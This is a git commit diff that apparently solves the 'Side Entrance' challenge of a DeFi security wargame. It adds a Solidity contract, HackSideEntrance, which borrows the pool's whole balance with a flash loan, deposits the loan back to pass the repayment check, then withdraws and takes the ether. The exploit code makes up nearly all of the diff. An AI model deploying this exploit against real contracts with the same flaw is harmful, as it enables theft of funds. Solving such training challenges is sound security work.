dd9d72af28f6115c261adce540c1994ad5d3d932
obedlaws <92595276+obedlaws@users.noreply.github.com>
2021-12-21 20:16:37 -0500

    Side Entrance Completed

--- contracts/side-entrance/SideEntranceLenderPool.sol
+++ contracts/side-entrance/SideEntranceLenderPool.sol
@@ -30,4 +30,22 @@ contract SideEntranceLenderPool {
         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
     }
 }
- 
+ contract HackSideEntrance {
+    SideEntranceLenderPool public pool;
+
+    constructor(address _pool) public {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    fallback() external payable {}
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+}
